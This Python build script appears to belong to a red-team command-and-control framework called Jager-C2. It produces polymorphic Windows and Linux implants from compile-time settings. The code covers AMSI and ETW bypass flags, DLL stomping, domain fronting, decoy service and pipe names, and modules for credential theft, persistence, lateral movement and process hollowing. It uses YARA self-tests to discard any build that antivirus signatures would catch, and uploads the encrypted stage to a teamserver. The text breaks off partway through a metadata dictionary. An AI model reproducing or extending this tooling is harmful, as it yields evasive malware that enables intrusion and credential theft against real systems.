"""
Jager-C2 Polymorphic Build Pipeline

Generates unique implant binaries per engagement with:
- Randomized string table (no static IOC strings)
- Per-build AES key + IV for Stage-1 encryption
- Compile-time configuration injection via -D flags
- YARA validation against known signatures
- Binary mutation (junk code insertion, function reordering)
- IOC profile integration (from JagerExec)
"""

import os
import sys
import json
import hashlib
import hmac
import secrets
import struct
import subprocess
import tempfile
import shutil
import re
import shlex
from pathlib import Path
from datetime import datetime, timezone

_BLOCKED_OVERLAY_KEYS = {"aes_key", "aes_iv"}

DLL_STOMP_CANDIDATES = ["amsi.dll", "clrjit.dll", "mscoree.dll", "version.dll"]

VALID_DOMAIN_FRONT_CDNS = [
    "cloudfront.net",
    "azureedge.net",
    "fastly.net",
    "akamaized.net",
]


class BuildError(RuntimeError):
    """Raised when implant build validation fails."""


def _load_build_secret() -> str:
    build_secret = os.environ.get("JAGER_BUILD_SECRET", "")
    if not build_secret:
        secret_file = Path(__file__).parent.parent / "data" / "build-secret.txt"
        if secret_file.exists():
            build_secret = secret_file.read_text().strip()
    return build_secret


def _compute_build_token(build_id: str) -> str:
    build_secret = _load_build_secret()
    if not build_secret:
        return ""
    return hmac.new(build_secret.encode(), build_id.encode(), hashlib.sha256).hexdigest()


def _validate_engagement_id(eid: str) -> str:
    """Validate engagement_id for safe use in paths and profile data."""
    eid = str(eid)
    if not re.match(r'^[a-zA-Z0-9_-]+$', eid):
        raise ValueError("Invalid engagement_id: must be alphanumeric/hyphen/underscore")
    return eid


def _validate_overlay(overlay: dict) -> dict:
    """Validate and sanitize profile overlay."""
    if ioc := overlay.get("ioc"):
        for blocked in _BLOCKED_OVERLAY_KEYS:
            if blocked in ioc:
                raise ValueError(
                    f"Profile overlay cannot override '{blocked}' -- "
                    "crypto material is generated per-build"
                )

    if eid := overlay.get("engagement_id"):
        _validate_engagement_id(eid)

    return overlay

# --- IOC Profile ---

class IOCProfile:
    """Per-engagement IOC profile controlling binary fingerprint."""

    def __init__(self, profile_path: str = None):
        self.profile = self._load_or_generate(profile_path)

    def _load_or_generate(self, path):
        if path and os.path.exists(path):
            with open(path) as f:
                return json.load(f)
        return self._generate_fresh()

    def apply_malleable_overlay(self, overlay_path: str):
        """Merge teamserver malleable profile overlay (paths, UA, wire transforms, evasion)."""
        if not overlay_path or not os.path.exists(overlay_path):
            return
        with open(overlay_path) as f:
            overlay = json.load(f)
        _validate_overlay(overlay)
        if ua := overlay.get("user_agent"):
            self.profile["user_agents"] = [ua]
        table = self.profile.setdefault("string_table", self._generate_string_table())
        for key in ("checkin_path", "register_path", "result_path", "stage1_path", "tunnel_path"):
            if overlay.get(key):
                table[key] = overlay[key]
        if wire := overlay.get("malleable_wire"):
            self.profile["malleable_wire"] = wire
        if hdrs := overlay.get("http_headers"):
            self.profile["http_headers"] = {**self.profile.get("http_headers", {}), **hdrs}
        if evasion := overlay.get("evasion"):
            self.profile["evasion"] = evasion
        if ioc := overlay.get("ioc"):
            for k in ("named_pipes", "service_names", "mutex_names"):
                if ioc.get(k):
                    self.profile[k] = ioc[k]
        if eid := overlay.get("engagement_id"):
            self.profile["engagement_id"] = _validate_engagement_id(eid)
        if fp := overlay.get("profile_fingerprint"):
            self.profile["profile_fingerprint"] = fp
        if bn := overlay.get("build_nonce"):
            self.profile["build_nonce"] = bn
        if pname := overlay.get("profile_name"):
            self.profile["profile_name"] = pname
        if pin := overlay.get("cert_pin_hash") or overlay.get("cert_pin"):
            self.profile["cert_pin_hash"] = pin
        if df := overlay.get("domain_front"):
            self.profile["domain_front"] = df
        if overlay.get("sleep_time") is not None:
            self.profile["sleep_time"] = int(overlay["sleep_time"])
        if overlay.get("jitter") is not None:
            self.profile["jitter"] = int(overlay["jitter"])

    @classmethod
    def from_engagement_seed(cls, engagement_id: str, build_nonce: str = "", profile_path: str = None):
        """Deterministic IOC profile from engagement + build nonce (JagerExec pattern)."""
        engagement_id = _validate_engagement_id(engagement_id)
        inst = cls(profile_path)
        nonce = build_nonce or secrets.token_hex(8)
        seed = hashlib.sha256(f"ioc:{engagement_id}:{nonce}".encode()).digest()
        inst.profile["engagement_id"] = engagement_id
        inst.profile["build_nonce"] = nonce
        inst.profile["aes_key"] = hashlib.sha256(seed + b"aes-key").hexdigest()[:64]
        inst.profile["aes_iv"] = hashlib.sha256(seed + b"aes-iv").hexdigest()[:32]
        pipe_prefixes = ["svc", "atsvc", "spoolss", "srvsvc"]
        pipes = []
        for i, prefix in enumerate(pipe_prefixes):
            h = hashlib.sha256(seed + struct.pack("<I", i)).hexdigest()[:8]
            pipes.append(f"\\\\pipe\\{prefix}_{h}")
        inst.profile["named_pipes"] = pipes
        svc_bases = ["WinUpdate", "SysHelper", "NetAgent"]
        services = []
        for i, base in enumerate(svc_bases):
            h = hashlib.sha256(seed + struct.pack("<I", i + 100)).hexdigest()[:6]
            services.append(f"{base}{h}")
        inst.profile["service_names"] = services
        inst.profile["mutex_names"] = [f"Global\\{hashlib.sha256(seed + b'mutex').hexdigest()[:16]}"]
        return inst

    def _generate_fresh(self):
        return {
            "engagement_id": secrets.token_hex(8),
            "created": datetime.now(timezone.utc).isoformat(),
            "aes_key": secrets.token_hex(32),
            "aes_iv": secrets.token_hex(16),
            "user_agents": [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
            ],
            "http_headers": {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
            },
            "named_pipes": [
                f"\\\\\\\\pipe\\\\{secrets.token_hex(4)}",
                f"\\\\\\\\pipe\\\\{secrets.token_hex(4)}",
            ],
            "service_names": [
                self._random_service_name(),
                self._random_service_name(),
            ],
            "mutex_names": [
                f"Global\\{secrets.token_hex(8)}",
            ],
            "string_table": self._generate_string_table(),
            "sleep_range": {"min": 45, "max": 90, "jitter": 25},
            "kill_date": None,
        }

    def _random_service_name(self):
        prefixes = ["Win", "Sys", "Net", "MS", "App", "Svc"]
        suffixes = ["Update", "Helper", "Manager", "Service", "Agent", "Monitor"]
        return secrets.choice(prefixes) + secrets.choice(suffixes) + secrets.token_hex(2)

    def _generate_string_table(self):
        """Generate per-build HTTP paths. Must match teamserver HTTPS listener routes."""
        return {
            "checkin_path": "/api/v1/checkin",
            "register_path": "/api/v1/register",
            "result_path": "/api/v1/result",
            "stage1_path": "/api/v1/stage",
            "tunnel_path": "/api/v1/tunnel",
        }

    def save(self, path: str):
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'w') as f:
            json.dump(self.profile, f, indent=2)

    @property
    def aes_key(self): return self.profile["aes_key"]

    @property
    def aes_iv(self): return self.profile["aes_iv"]

    @property
    def user_agent(self): return secrets.choice(self.profile["user_agents"])

    @property
    def strings(self): return self.profile["string_table"]


# --- String Encryption ---

class StringEncryptor:
    """Encrypts string constants at compile time using XOR with per-build key."""

    def __init__(self):
        self.key = secrets.token_bytes(16)

    def encrypt(self, plaintext: str) -> tuple:
        """Returns (encrypted_bytes_hex, key_hex, length)."""
        data = plaintext.encode('utf-8')
        encrypted = bytes(b ^ self.key[i % len(self.key)] for i, b in enumerate(data))
        return encrypted.hex(), self.key.hex(), len(data)

    def generate_c_decryptor(self, var_name: str, encrypted_hex: str, key_hex: str, length: int) -> str:
        """Generate C code that decrypts string at runtime."""
        enc_bytes = ', '.join(f'0x{encrypted_hex[i:i+2]}' for i in range(0, len(encrypted_hex), 2))
        key_bytes = ', '.join(f'0x{key_hex[i:i+2]}' for i in range(0, len(key_hex), 2))

        return f"""static char {var_name}[{length + 1}];
static void decrypt_{var_name}(void) {{
    static const BYTE enc[] = {{{enc_bytes}}};
    static const BYTE key[] = {{{key_bytes}}};
    for (int i = 0; i < {length}; i++)
        {var_name}[i] = enc[i] ^ key[i % {len(self.key)}];
    {var_name}[{length}] = '\\0';
}}"""


# --- Build Configuration ---

class BuildConfig:
    """Compile-time configuration for an implant build."""

    def __init__(self, c2_url: str, profile: IOCProfile, **kwargs):
        self.c2_url = c2_url
        self.profile = profile
        self.sleep_seconds = kwargs.get('sleep', profile.profile['sleep_range']['min'])
        self.jitter_percent = kwargs.get('jitter', profile.profile['sleep_range']['jitter'])
        self.kill_date = kwargs.get('kill_date', 0)
        self.sleep_technique = kwargs.get('sleep_technique')
        self.syscall_method = kwargs.get('syscall_method', 1)
        self.patch_etw = kwargs.get('patch_etw', True)
        self.patch_amsi = kwargs.get('patch_amsi', True)
        self.unhook_on_load = kwargs.get('unhook_on_load', True)
        self.heap_encrypt = kwargs.get('heap_encrypt', True)
        self.anti_analysis = kwargs.get('anti_analysis', True)
        self.amsi_bypass_method = kwargs.get('amsi_bypass_method', 'hwbp')
        self.inject_method = kwargs.get('inject_method', 1)
        self.output_format = kwargs.get('format', 'exe')
        self.arch = kwargs.get('arch', 'x64')
        self.platform = kwargs.get('platform', 'windows')
        self.build_id = kwargs.get('build_id', '')
        self.workspace = kwargs.get('workspace', '')

    def _is_lab_build(self) -> bool:
        ws = self.workspace or os.environ.get('HARNESS_WORKSPACE') or os.environ.get('JAGER_WORKSPACE', '')
        if not ws:
            return False
        cfg_path = Path(ws) / 'engagement.config.json'
        if not cfg_path.exists():
            return False
        try:
            with open(cfg_path) as f:
                return json.load(f).get('data_classification') == 'lab'
        except (json.JSONDecodeError, OSError):
            return False

    def to_compile_flags(self) -> list:
        """Generate -D flags for MinGW compilation."""
        def c_escape(s):
            return s.replace('\\', '\\\\').replace('"', '\\"')
        strings = self.profile.strings
        url = c_escape(self.c2_url)
        ua = c_escape(self.profile.user_agent)
        raw_bid = self.build_id or self.profile.profile.get('engagement_id', 'jager')
        bid = c_escape(raw_bid)
        flags = [
            f'-DC2_URL="{url}"',
            f'-DC2_CHECKIN_PATH="{strings["checkin_path"]}"',
            f'-DC2_CHECKIN_PATH_OVERRIDE=1',
            f'-DC2_REGISTER_PATH="{strings["register_path"]}"',
            f'-DC2_RESULT_PATH="{strings["result_path"]}"',
            f'-DC2_TUNNEL_PATH="{strings.get("tunnel_path", "/api/v1/tunnel")}"',
            f'-DUSER_AGENT="{ua}"',
            f'-DBUILD_ID="{bid}"',
            f'-DSLEEP_SECONDS={self.sleep_seconds}',
            f'-DJITTER_PERCENT={self.jitter_percent}',
            f'-DKILL_DATE={self.kill_date}',
            f'-DSLEEP_TECHNIQUE={self.sleep_technique if self.sleep_technique is not None else 2}',
            f'-DSYSCALL_METHOD={self.syscall_method}',
            f'-DPATCH_ETW={1 if self.patch_etw else 0}',
            f'-DPATCH_AMSI={1 if self.patch_amsi else 0}',
            f'-DUNHOOK_ON_LOAD={1 if self.unhook_on_load else 0}',
            f'-DHEAP_ENCRYPT={1 if self.heap_encrypt else 0}',
            f'-DANTI_ANALYSIS={1 if getattr(self, "anti_analysis", False) else 0}',
            f'-DINJECT_METHOD={self.inject_method}',
        ]
        if token := _compute_build_token(raw_bid):
            flags.append(f'-DBUILD_TOKEN="{c_escape(token)}"')
        bypass_map = {'hwbp': 0, 'pageguard': 1, 'patch': 2}
        method = self.amsi_bypass_method
        if isinstance(method, str):
            method = bypass_map.get(method.lower(), 0)
        flags.append(f'-DAMSI_BYPASS_METHOD={int(method)}')
        hdrs = self.profile.profile.get('http_headers', {})
        if hdrs.get('Accept'):
            flags.append(f'-DHTTP_HDR_ACCEPT="{c_escape(hdrs["Accept"])}"')
        if hdrs.get('Accept-Language'):
            flags.append(f'-DHTTP_HDR_ACCEPT_LANGUAGE="{c_escape(hdrs["Accept-Language"])}"')
        custom_idx = 0
        for key, val in hdrs.items():
            if key in ('Accept', 'Accept-Language') or not val:
                continue
            flags.append(f'-DCUSTOM_HEADER_{custom_idx}_KEY="{c_escape(key)}"')
            flags.append(f'-DCUSTOM_HEADER_{custom_idx}_VAL="{c_escape(str(val))}"')
            custom_idx += 1
        stomp = self.profile.profile.get('dll_stomp_target')
        if not stomp:
            stomp = secrets.choice(DLL_STOMP_CANDIDATES)
            self.profile.profile['dll_stomp_target'] = stomp
        flags.append(f'-DDLL_STOMP_TARGET="{c_escape(stomp)}"')
        malleable = self.profile.profile.get('malleable_wire', {})
        if malleable.get('out_base64'):
            flags.append('-DMALLEABLE_OUT_BASE64=1')
        if malleable.get('in_base64'):
            flags.append('-DMALLEABLE_IN_BASE64=1')
        if pre := malleable.get('out_prepend'):
            flags.append(f'-DMALLEABLE_OUT_PREPEND="{c_escape(pre)}"')
        if app := malleable.get('out_append'):
            flags.append(f'-DMALLEABLE_OUT_APPEND="{c_escape(app)}"')
        if pre := malleable.get('in_prepend'):
            flags.append(f'-DMALLEABLE_IN_PREPEND="{c_escape(pre)}"')
        if app := malleable.get('in_append'):
            flags.append(f'-DMALLEABLE_IN_APPEND="{c_escape(app)}"')
        if mk := malleable.get('mask_key'):
            flags.append(f'-DMALLEABLE_MASK_KEY={ord(mk[0]) if isinstance(mk, str) else int(mk)}')
        pin = self.profile.profile.get('cert_pin_hash') or self.profile.profile.get('cert_pin')
        if pin:
            flags.append(f'-DCERT_PIN_HASH="{c_escape(pin)}"')
        if self._is_lab_build():
            flags.append('-DLAB_NO_TLS_VERIFY')
        if urls := self.profile.profile.get('c2_url_list'):
            flags.append(f'-DC2_URL_LIST="{c_escape(urls)}"')
        if df := self.profile.profile.get('domain_front'):
            if cdn := df.get('cdn_host'):
                flags.append(f'-DDOMAIN_FRONT_CDN="{c_escape(cdn)}"')
            if host := df.get('actual_host'):
                flags.append(f'-DDOMAIN_FRONT_HOST="{c_escape(host)}"')
        if token := self.profile.profile.get('socks_auth_token'):
            flags.append(f'-DSOCKS_AUTH_TOKEN="{c_escape(token)}"')
        if pipes := self.profile.profile.get('named_pipes'):
            pipe = pipes[0].replace('\\\\pipe\\', '').replace('\\pipe\\', '')
            flags.append(f'-DPIPE_NAME="{c_escape(pipe)}"')
        if svcs := self.profile.profile.get('service_names'):
            flags.append(f'-DSERVICE_NAME="{c_escape(svcs[0])}"')
        if mutexes := self.profile.profile.get('mutex_names'):
            flags.append(f'-DMUTEX_NAME="{c_escape(mutexes[0])}"')
        flags.append(f'-DC2_STAGE_PATH="{c_escape(strings.get("stage1_path", "/api/v1/stage"))}"')
        return flags

    def to_stager_flags(self, build_id: str = "") -> list:
        """Generate -D flags for C stager compilation."""
        def c_escape(s):
            return s.replace('\\', '\\\\').replace('"', '\\"')
        strings = self.profile.strings
        if build_id:
            token = _compute_build_token(build_id)
            if token:
                stage_path = f"/api/v1/stage?id={build_id}&token={token}"
            else:
                stage_path = f"/api/v1/stage?id={build_id}"
        else:
            stage_path = strings["stage1_path"]
        url = c_escape(self.c2_url)
        ua = c_escape(self.profile.user_agent)
        flags = [
            f'-DSTAGER_C2_URL="{url}"',
            f'-DSTAGER_STAGE_PATH="{stage_path}"',
            f'-DSTAGER_USER_AGENT="{ua}"',
            f'-DSTAGER_AES_KEY="{self.profile.aes_key}"',
            f'-DSTAGER_AES_IV="{self.profile.aes_iv}"',
            f'-DSTAGER_AES_KEY_SET=1',
            f'-DSTAGER_KILL_DATE={self.kill_date}',
            f'-DSTAGER_DELAY_MS=5000',
        ]
        if build_id:
            if token := _compute_build_token(build_id):
                flags.append(f'-DBUILD_TOKEN="{c_escape(token)}"')
        pin = self.profile.profile.get('cert_pin_hash') or self.profile.profile.get('cert_pin')
        if pin:
            flags.append(f'-DCERT_PIN_HASH="{c_escape(pin)}"')
        if self._is_lab_build():
            flags.append('-DLAB_NO_TLS_VERIFY')
        return flags


# --- YARA Validation ---

class YARAValidator:
    """Validate built binaries against known C2/malware YARA rules."""

    EMBEDDED_RULES = """
rule cobalt_strike_strings {
    strings:
        $s1 = "beacon.dll" ascii
        $s2 = "ReflectiveLoader" ascii
        $s3 = "%d is an x86 dll" ascii
        $s4 = "powershell -nop" ascii
    condition:
        any of them
}

rule sliver_strings {
    strings:
        $s1 = "sliverpb" ascii
        $s2 = "bishopfox" ascii
        $s3 = "implant.Implant" ascii
    condition:
        any of them
}

rule mythic_strings {
    strings:
        $s1 = "mythic" ascii nocase
        $s2 = "apollo" ascii nocase
        $s3 = "poseidon" ascii nocase
    condition:
        any of them
}

rule generic_c2_indicators {
    strings:
        $s1 = "mimikatz" ascii nocase
        $s2 = "metasploit" ascii nocase
        $s3 = "meterpreter" ascii nocase
        $s4 = "cobaltstrike" ascii nocase
    condition:
        any of them
}
"""

    def __init__(self):
        yara_dir = Path(__file__).parent.parent / "yara"
        self._strings_path = yara_dir / "self_test_strings.yar"
        self._pe_path = yara_dir / "self_test_pe.yar"
        self._legacy_path = yara_dir / "self_test.yar"

    def _compile_rules(self, is_linux: bool = False):
        import yara
        sources = {"embedded": self.EMBEDDED_RULES}
        if self._strings_path.is_file():
            sources["self_test_strings"] = self._strings_path.read_text(encoding="utf-8")
        if not is_linux and self._pe_path.is_file():
            sources["self_test_pe"] = self._pe_path.read_text(encoding="utf-8")
        if not sources.get("self_test_strings") and self._legacy_path.is_file():
            rule_text = self._legacy_path.read_text(encoding="utf-8")
            if not (is_linux and ("pe." in rule_text or 'import "pe"' in rule_text)):
                sources["self_test"] = rule_text
        return yara.compile(sources=sources)

    def _handle_validation_result(self, passed: bool, matches: list) -> tuple:
        """Apply fail-closed YARA policy (dev mode only relaxes missing yara-python)."""
        if passed:
            return (True, matches)
        raise BuildError(f"YARA self-test FAILED: {matches}")

    def validate(self, binary_path: str, is_linux: bool = False) -> tuple:
        """Returns (passed: bool, matches: list)."""
        try:
            rules = self._compile_rules(is_linux=is_linux)
            matches = rules.match(binary_path)
            passed = len(matches) == 0
            match_strs = [str(m) for m in matches]
            return self._handle_validation_result(passed, match_strs)
        except ImportError:
            if os.environ.get("JAGER_DEV_MODE") == "1":
                return (True, ["WARN: yara-python not installed, skipping"])
            return (False, ["FAIL: yara-python not installed -- required for production builds"])


# --- Main Builder ---

class ImplantBuilder:
    """Orchestrates the full polymorphic build pipeline."""

    def __init__(self, source_dir: str, output_dir: str, profile: IOCProfile):
        self.source_dir = Path(source_dir)
        self.output_dir = Path(output_dir).resolve()
        self.profile = profile
        self.validator = YARAValidator()
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self._poly_temp: Path | None = None
        self._obf_key: int = 0
        self._sleep_technique: int | None = None
        self._decrypt_str_injected: bool = False

    def _prepare_polymorphic_tree(
        self,
        config: BuildConfig,
        seed: int | None = None,
        dest_dir: Path | None = None,
    ) -> Path:
        """Copy implant tree and apply per-build source mutations."""
        from polymorphic import PolymorphicEngine, PolymorphicConfig, SKIP_RENAME_FILES

        if seed is None:
            seed_src = f"{self.profile.profile['engagement_id']}:{config.c2_url}:{secrets.token_hex(4)}"
            seed = int.from_bytes(hashlib.sha256(seed_src.encode()).digest()[:8], "big")
        # Conservative profile: renames/string encryption break macros and BOF loader.
        # Per-build uniqueness comes from IOCProfile -D flags + dead code/junk insertion.
        skip_rename = set(SKIP_RENAME_FILES)
        engine = PolymorphicEngine(PolymorphicConfig(
            seed=seed,
            rename_functions=True,
            rename_variables=True,
            encrypt_strings=True,
            insert_dead_code=True,
            insert_opaque_predicates=False,
            junk_api_calls=True,
            dead_code_density=0.08,
            max_junk_calls=3,
        ))

        work_dir = dest_dir if dest_dir is not None else Path(tempfile.mkdtemp(prefix="jager-poly-"))
        if dest_dir is None:
            self._poly_temp = work_dir
        for root, dirs, files in os.walk(self.source_dir):
            dirs.sort()
            rel = Path(root).relative_to(self.source_dir)
            dest_root = work_dir / rel
            dest_root.mkdir(parents=True, exist_ok=True)
            for name in sorted(files):
                src = Path(root) / name
                dst = dest_root / name
                if name.endswith(".c"):
                    source = src.read_text(encoding="utf-8", errors="replace")
                    if name in skip_rename:
                        dst.write_text(source, encoding="utf-8")
                    else:
                        dst.write_text(engine.transform_source(source, name), encoding="utf-8")
                else:
                    shutil.copy2(src, dst)

        manifest_path = self.output_dir / f"poly-manifest-{engine.manifest.build_id}.json"
        engine.save_manifest(str(manifest_path))
        ok, val_errors = engine.validate_transforms(str(work_dir))
        if not ok:
            raise RuntimeError(f"Polymorphic transform validation failed: {val_errors}")

        if engine.has_encrypted_strings:
            decryptor_path = work_dir / "src" / "util" / "__decrypt_str.c"
            decryptor_path.parent.mkdir(parents=True, exist_ok=True)
            decryptor_path.write_text(engine.generate_string_decryptor(), encoding="utf-8")
            self._decrypt_str_injected = True

        self._obf_key = engine.obf_key
        if config.sleep_technique is None:
            config.sleep_technique = engine.select_sleep_technique()
        self._sleep_technique = config.sleep_technique
        names = {1: "ekko", 2: "foliage", 3: "zilean"}
        print(f"[*] Polymorphic seed={seed} obf_key=0x{engine.obf_key:02X} "
              f"sleep={names.get(config.sleep_technique, config.sleep_technique)} "
              f"transforms={engine.manifest.transformations}")
        return work_dir

    def dry_run_transform(self, config: BuildConfig, seed: int, output_dir: str | Path) -> Path:
        """Apply polymorphic transforms to output_dir without compiling."""
        out = Path(output_dir).resolve()
        self.output_dir = out
        out.mkdir(parents=True, exist_ok=True)
        return self._prepare_polymorphic_tree(config, seed=seed, dest_dir=out)

    def _cleanup_polymorphic_tree(self) -> None:
        if self._poly_temp and self._poly_temp.exists():
            shutil.rmtree(self._poly_temp, ignore_errors=True)
            self._poly_temp = None

    def upload_stage_payload(self, build_id: str, encrypted_path: str,
                             teamserver_url: str = "http://127.0.0.1:31338") -> dict:
        """Upload encrypted stage-1 to teamserver for stager delivery."""
        import urllib.request
        payload = Path(encrypted_path).read_bytes()
        api_key = os.environ.get("JAGER_MGMT_API_KEY", "")
        if not api_key:
            key_file = Path(self.source_dir).parent.parent / "data" / "api-key.txt"
            if key_file.exists():
                api_key = key_file.read_text().strip()

        headers = {"Content-Type": "application/json"}
        if api_key:
            headers["X-Jager-C2-Api-Key"] = api_key

        req = urllib.request.Request(
            f"{teamserver_url.rstrip('/')}/mgmt/build/stage",
            data=json.dumps({
                "build_id": build_id,
                "payload_b64": __import__("base64").b64encode(payload).decode(),
            }).encode(),
            headers=headers,
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=15) as resp:
                return json.loads(resp.read())
        except Exception as exc:
            return {"success": False, "error": str(exc)}

    @staticmethod
    def _to_wsl_path(win_path: str) -> str:
        """Convert a Windows path to its WSL /mnt/... equivalent."""
        p = win_path.replace('\\', '/')
        m = re.match(r'^([A-Za-z]):(.*)', p)
        if m:
            return f"/mnt/{m.group(1).lower()}{m.group(2)}"
        return p

    def build_implant(self, config: BuildConfig, *, polymorphic: bool = True) -> dict:
        """Build Stage-1 implant. Returns build metadata."""
        print(f"[*] Building implant for {config.c2_url}")
        print(f"[*] Profile: {self.profile.profile['engagement_id']}")
        print(f"[*] Platform: {config.platform}")

        if config.platform == 'linux':
            return self._compile_linux_implant(config)

        max_attempts = 5 if polymorphic else 1
        last_error = ""
        for attempt in range(max_attempts):
            compile_root = (
                self._prepare_polymorphic_tree(config, seed=secrets.randbits(64) if attempt else None)
                if polymorphic else self.source_dir
            )
            result = self._compile_implant(config, compile_root, polymorphic=polymorphic)
            if result.get("success"):
                return result
            last_error = result.get("error", "unknown compile error")
            if attempt + 1 < max_attempts:
                print(f"[!] Polymorphic compile failed (attempt {attempt + 1}/{max_attempts}), retrying...")
        return {"success": False, "error": last_error}

    def _compile_implant(self, config: BuildConfig, compile_root: Path, *, polymorphic: bool) -> dict:
        """Compile implant from prepared source tree."""

        # Determine compiler and flags
        if config.arch == 'x64':
            cc = 'x86_64-w64-mingw32-gcc'
        else:
            cc = 'i686-w64-mingw32-gcc'

        sources = [
            'src/core/beacon.c',
            'src/core/transport.c',
            'src/core/transport_dns.c',
            'src/core/transport_smb.c',
            'src/core/transport_tcp.c',
            'src/core/transport_front.c',
            'src/core/transport_failover.c',
            'src/core/tunnel.c',
            'src/core/malleable.c',
            'src/util/base64.c',
            'src/util/json.c',
            'src/util/json_emit.c',
            'src/util/crypto.c',
            'src/util/tracked_alloc.c',
            'src/core/tasks.c',
            'src/core/tasks_postex.c',
            'src/filesystem/fs.c',
            'src/core/process.c',
            'src/evasion/syscalls.c',
            'src/evasion/sleep_mask.c',
            'src/evasion/sleep_stub.c',
            'src/evasion/stack_spoof.c',
            'src/evasion/patches.c',
            'src/evasion/hwbp_bypass.c',
            'src/evasion/anti_analysis.c',
            'src/evasion/injection.c',
            'src/evasion/module_stomp.c',
            'src/evasion/threadless_inject.c',
            'src/evasion/ppid_spoof.c',
            'src/evasion/return_spoof.c',
            'src/evasion/etw_ti.c',
            'src/evasion/process_hollow.c',
            'src/evasion/dll_unhook.c',
            'src/execution/bof_loader.c',
            'src/pivot/socks.c',
            'src/pivot/portfwd.c',
            'src/pivot/tasks_pivot.c',
            'src/pivot/pipe.c',
            'src/pivot/tcp_pivot.c',
            'src/pivot/p2p_relay.c',
            'src/postex/credentials.c',
            'src/postex/discovery.c',
            'src/postex/persistence.c',
            'src/postex/lateral.c',
            'src/postex/postex_wrappers.c',
            'src/postex/privesc.c',
            'src/postex/token_ops.c',
            'src/postex/exec_clr.c',
            'src/postex/auto_enum.c',
            'src/asm/spoof.x64.S',
            'src/asm/syscalls.x64.S',
        ]

        src_paths = [str(compile_root / s) for s in sources]

        if self._decrypt_str_injected:
            decrypt_src = compile_root / 'src' / 'util' / '__decrypt_str.c'
            if decrypt_src.exists():
                src_paths.append(str(decrypt_src))

        timestamp = datetime.now().strftime('%Y%m%d-%H%M%S')
        build_id = secrets.token_hex(4)
        config.build_id = build_id
        if config.sleep_technique is None:
            from polymorphic import select_sleep_technique
            config.sleep_technique = self._sleep_technique
            if config.sleep_technique is None:
                config.sleep_technique = select_sleep_technique(secrets.randbits(64))
        compile_flags = config.to_compile_flags()
        if self._obf_key:
            compile_flags.append(f'-DOBF_KEY=0x{self._obf_key:02X}')
        elif polymorphic:
            import random as _random
            obf = _random.randint(1, 255)
            compile_flags.append(f'-DOBF_KEY=0x{obf:02X}')

        if config.output_format == 'dll':
            out_name = f"implant-{build_id}-{timestamp}.dll"
            format_flags = ['-DBUILD_DLL', '-shared']
        else:
            out_name = f"implant-{build_id}-{timestamp}.exe"
            format_flags = ['-mwindows']

        out_path = (self.output_dir / out_name).resolve()

        gcc_cmd = [
            cc,
            '-Wall', '-Os', '-s',
            '-DWIN32_LEAN_AND_MEAN',
            '-Iinclude',
            *compile_flags,
            *format_flags,
            *src_paths,
            '-o', str(out_path),
            '-lwinhttp', '-ladvapi32', '-lws2_32', '-liphlpapi', '-lnetapi32', '-ldnsapi',
            '-lbcrypt', '-lcrypt32', '-lsecur32', '-lgdi32', '-luser32', '-lpsapi',
            '-lole32', '-loleaut32', '-luuid', '-lwbemuuid',
            '-Wl,--gc-sections',
        ]

        print(f"[*] Compiling: {cc} -> {out_name}")

        if sys.platform == 'win32':
            wsl_distro = os.environ.get('JAGER_WSL_DISTRO', 'kali-linux')
            wsl_src = self._to_wsl_path(str(compile_root)) if compile_root else self._to_wsl_path(str(self.source_dir))
            wsl_out = self._to_wsl_path(str(out_path))
            wsl_gcc_args = [cc, '-Wall', '-Os', '-s', '-DWIN32_LEAN_AND_MEAN', '-Iinclude']
            wsl_gcc_args.extend(compile_flags)
            wsl_gcc_args.extend(format_flags)
            wsl_gcc_args.extend(self._to_wsl_path(p) for p in src_paths)
            wsl_gcc_args.extend([
                '-o', wsl_out,
                '-lwinhttp', '-ladvapi32', '-lws2_32', '-liphlpapi', '-lnetapi32', '-ldnsapi',
                '-lbcrypt', '-lcrypt32', '-ldbghelp', '-lole32', '-loleaut32', '-lntdll',
                '-lshlwapi', '-luuid', '-lwbemuuid',
                '-Wl,--gc-sections',
            ])
            shell_cmd = shlex.join(wsl_gcc_args)
            cmd = ['wsl', '-d', wsl_distro, '--', 'bash', '-c', f'cd {wsl_src} && {shell_cmd}']
        else:
            cmd = gcc_cmd

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, cwd=str(compile_root))
        finally:
            if polymorphic:
                self._cleanup_polymorphic_tree()

        if result.returncode != 0:
            print(f"[-] Compilation failed:\n{result.stderr}")
            return {"success": False, "error": result.stderr}

        # Hash the output
        sha256 = hashlib.sha256(open(out_path, 'rb').read()).hexdigest()
        file_size = os.path.getsize(out_path)

        # YARA validation: fail-closed (JAGER_DEV_MODE only relaxes missing yara-python)
        try:
            passed, matches = self.validator.validate(str(out_path))
        except BuildError as exc:
            print(f"[!] {exc}")
            os.remove(out_path)
            return {"success": False, "error": str(exc)}
        if not passed:
            print(f"[!] YARA MATCH DETECTED: {matches}")
            print(f"[!] Binary has known signatures - DO NOT DEPLOY")
            os.remove(out_path)
            return {"success": False, "error": f"YARA matches: {matches}"}

        print(f"[+] Build successful: {out_name} ({file_size} bytes)")
        print(f"[+] SHA256: {sha256}")
        print(f"[+] YARA: CLEAN")

        if config.output_format == 'shellcode':
            sc_path = out_path.with_suffix('.bin')
            try:
                subprocess.run(
                    ['objcopy', '-O', 'binary', '-j', '.text', str(out_path), str(sc_path)],
                    check=True, capture_output=True, text=True,
                )
                out_path = sc_path
                out_name = sc_path.name
                file_size = os.path.getsize(out_path)
                sha256 = hashlib.sha256(open(out_path, 'rb').read()).hexdigest()
                metadata_format = 'shellcode'
            except (FileNotFoundError, subprocess.CalledProcessError):
                print("[!] objcopy shellcode extract failed; deploy EXE or install binutils")
                metadata_format = config.output_format
        else:
            metadata_format = config.output_format

        metadata = {
            "success": True,
            "build_id": build_id,
            "filename": out_name,
            "path": str(out_path),
            "sha256": sha256,
            "size": file_size,
            "arch": config.arch,
            "format": metadata_format,
            "c2_url": config.c2_url,
            "profile_id": self.profile.profile["engagement_id"],
            "kill_date": config.kill_date,
            "timestamp": timestamp,
            "yara_clean": passed,
            "sleep_technique": config.sleep_technique,
